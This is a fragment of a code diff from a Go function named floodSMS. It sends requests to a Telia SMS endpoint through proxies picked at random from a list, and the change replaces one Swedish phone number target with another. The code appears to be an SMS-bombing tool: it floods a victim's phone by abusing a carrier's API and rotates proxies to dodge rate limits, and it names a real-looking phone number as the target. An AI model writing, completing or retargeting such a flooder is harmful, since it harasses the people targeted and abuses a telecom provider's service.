@@ -52,7 +52,7 @@ func floodSMS() {
 	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
-	data := `{"identifier": "46706505038"}` // Fixed the JSON formatting issue
+	data := `{"identifier": "46762989487"}` // Fixed the JSON formatting issue
 
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
